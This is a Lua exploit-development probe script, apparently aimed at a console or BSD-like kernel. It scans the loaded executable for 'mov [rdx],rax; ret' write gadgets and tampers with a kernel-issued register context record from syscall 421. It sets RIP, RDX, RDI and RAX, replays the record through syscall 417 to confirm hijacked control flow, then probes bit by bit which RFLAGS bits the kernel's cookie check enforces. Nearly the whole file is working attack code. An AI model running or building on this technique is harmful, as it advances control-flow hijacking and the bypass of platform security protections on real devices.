-- CRASH_CLASS: MODERATE
-- PROBE 816b: prove register control, then map the RFLAGS cookie bit by bit
--
-- Context: 814b proved a kernel-issued 421 record can be fed straight back
-- through 417 (ret=0) and the thread continues. 816a proved that changing
-- IOPL inside that same record makes 417 return -1, so the cookie mask
-- 0xFFDAB22A really does cover bits 12 and 13.
--
-- The -1 in 816a is therefore the gate doing its job, not the primitive
-- failing. This probe separates the two questions:
--   [E]/[G]  is the frame a real register install? Set RIP to a write gadget
--            in eboot, RDX/RDI to a canary page, RAX to a marker, leave RSP
--            alone so the gadget's `ret` continues the loader normally.
--   [H]      which RFLAGS bits does the cookie actually police? Each row is a
--            fresh 421 record with one bit changed, so a rejected row costs
--            nothing but an -1.

print("=== PROBE 816b: FRAME REGISTER CONTROL + RFLAGS BIT MAP ===")
print("")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function safe_rd(addr)
    local ok, val = pcall(function() return memory.read_dword(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_rdb(addr)
    local ok, val = pcall(function() return memory.read_byte(addr) end)
    if ok then return to_num(val) end
    return nil
end
local function safe_wd(addr, val)
    local ok = pcall(function() memory.write_dword(addr, val) end)
    return ok
end
local function safe_rq(addr)
    local ok, val = pcall(function() return memory.read_qword(addr) end)
    if ok then return val end
    return nil
end
local function q(addr)
    local v = safe_rq(addr)
    if v == nil then return 0 end
    return to_num(v)
end
local function setq(addr, val)
    local lo = val % 4294967296
    local hi = math.floor(val / 4294967296) % 4294967296
    safe_wd(addr, lo)
    safe_wd(addr + 4, hi)
end

local sc421 = make_syscall(421)
local sc417 = make_syscall(417)
local sc674 = make_syscall(674)

local buf = memory.alloc(0x600)
local canary = memory.alloc(0x1000)
for off = 0, 0x5FF, 4 do safe_wd(buf + off, 0) end
for off = 0, 0xFFF, 4 do safe_wd(canary + off, 0) end

print(string.format("[0] pid=%d buf=0x%08X canary=0x%08X",
    to_num(syscall.getpid()), to_num(buf), to_num(canary)))

-- ---------------------------------------------------------------- eboot base
local regions = memory.alloc(0x8000)
for off = 0, 0x7FFF, 4 do safe_wd(regions + off, 0) end
local cnt = memory.alloc(8)
safe_wd(cnt, 0)
local okr, rr = pcall(function() return sc674(uint64(regions), uint64(72), uint64(512), uint64(cnt), uint64(0x40000000)) end)
local nreg = safe_rd(cnt) or 0
print(string.format("[A] 674 ret=%s regions=%d", tostring(rr), nreg))

local ebase, esize, ename = nil, 0, ""
local i = 0
while i < nreg do
    local r = regions + i * 72
    local start = safe_rd(r) or 0
    local stop = safe_rd(r + 4) or 0
    local prot = safe_rd(r + 0x18) or 0
    local nm = ""
    local k = 0
    while k < 24 do
        local c = safe_rdb(r + 0x20 + k)
        if not c or c == 0 then break end
        nm = nm .. string.char(c)
        k = k + 1
    end
    if prot == 5 and nm:find("executable") then
        ebase, esize, ename = start, stop - start, nm
    end
    i = i + 1
end
if not ebase then
    print("[A] no executable region found; aborting")
    print("=== PROBE 816b STOP ===")
    return
end
print(string.format("[A] eboot base=0x%08X size=0x%X name=[%s]", ebase, esize, ename))

-- ------------------------------------------------------- write-gadget scan
-- 48 89 02 C3 = mov [rdx], rax ; ret  -> little-endian dword 0xC3028948
-- 48 89 07 C3 = mov [rdi], rax ; ret  -> little-endian dword 0xC3078948
-- dword scan: 4 bytes per read, so a 0x40000 window is 65536 reads, not
-- 262144 pcalls. 815b's byte scan found the rdi form at ebase+0x1CED.
local function find_dw(want)
    local off = 0
    local limit = math.min(esize, 0x40000)
    while off < limit do
        local ok, d = pcall(function() return memory.read_dword(ebase + off) end)
        if ok and to_num(d) == want then return ebase + off end
        off = off + 4
    end
    return nil
end

local function bytes_are(addr, b1, b2, b3, b4)
    local ok1, v1 = pcall(function() return memory.read_byte(addr) end)
    local ok2, v2 = pcall(function() return memory.read_byte(addr + 1) end)
    local ok3, v3 = pcall(function() return memory.read_byte(addr + 2) end)
    local ok4, v4 = pcall(function() return memory.read_byte(addr + 3) end)
    if not (ok1 and ok2 and ok3 and ok4) then return false end
    return to_num(v1) == b1 and to_num(v2) == b2 and to_num(v3) == b3 and to_num(v4) == b4
end

local g_rdi, g_rdx
if bytes_are(ebase + 0x1CED, 0x48, 0x89, 0x07, 0xC3) then
    g_rdi = ebase + 0x1CED
end
if not g_rdi then g_rdi = find_dw(0xC3078948) end
g_rdx = find_dw(0xC3028948)
print(string.format("[B] mov [rdx],rax;ret=%s  mov [rdi],rax;ret=%s",
    g_rdx and string.format("0x%08X", g_rdx) or "none",
    g_rdi and string.format("0x%08X", g_rdi) or "none"))

local gadget = g_rdx or g_rdi
if not gadget then
    print("[B] no write gadget; skipping the control test")
end

-- ------------------------------------------------------ register control test
if gadget then
    local ok1, r1 = pcall(function() return sc421(uint64(buf)) end)
    local rip0 = q(buf + 0xE0)
    local rsp0 = q(buf + 0xF8)
    print(string.format("[E] 421 ret=%s RIP0=%016X RSP0=%016X", tostring(r1), rip0, rsp0))

    local MARK = 0xDEADBEEFCAFE
    setq(buf + 0x58, to_num(canary))   -- RDX
    setq(buf + 0x48, to_num(canary))   -- RDI
    setq(buf + 0x78, MARK)             -- RAX
    setq(buf + 0xE0, gadget)           -- RIP
    -- RSP deliberately untouched, so the gadget's `ret` returns to the
    -- loader's own caller exactly as 814b's unchanged round-trip did.

    local ok2, r2 = pcall(function() return sc417(uint64(buf)) end)
    print(string.format("[F] 417 ret=%s ok=%s", tostring(r2), tostring(ok2)))
    print(string.format("[G] canary[0]=%016X canary+8=%016X (want %016X)",
        q(canary), q(canary + 8), MARK))
    if q(canary) == MARK then
        print("[G] REGISTER CONTROL CONFIRMED: RIP + RDX + RDI + RAX are ours at CPL 3")
    end
end

-- --------------------------------------------------------- RFLAGS bit table
print("")
print("[H] RFLAGS cookie map (each row is a fresh 421 record)")

local rows = {
    {0x000202, "baseline (as issued)"},
    {0x000242, "ZF"},
    {0x000802, "OF"},
    {0x000042, "PF+ZF"},
    {0x010002, "RF  (bit 16)"},
    {0x040002, "AC  (bit 18)"},
    {0x000002, "IF cleared (bit 9)"},
    {0x000302, "TF  (bit 8)"},
    {0x004002, "NT  (bit 14)"},
}

local row = 1
while row <= #rows do
    local want = rows[row][1]
    local label = rows[row][2]
    local ok3, r3 = pcall(function() return sc421(uint64(buf)) end)
    if not ok3 then
        print(string.format("    %-24s 421 failed", label))
    else
        setq(buf + 0xF0, want)
        local ok4, r4 = pcall(function() return sc417(uint64(buf)) end)
        local verdict
        if tostring(r4) == "0xffffffffffffffffffffffff" or tostring(r4) == "-1" then
            verdict = "REJECTED"
        else
            verdict = "accepted (0x" .. tostring(r4) .. ")"
        end
        print(string.format("    RFLAGS 0x%06X %-24s -> %s", want, label, verdict))
        if verdict == "REJECTED" then
            -- the frame is untouched on a rejection; nothing else to undo
        end
    end
    row = row + 1
end

print("")
print("=== PROBE 816b DONE ===")
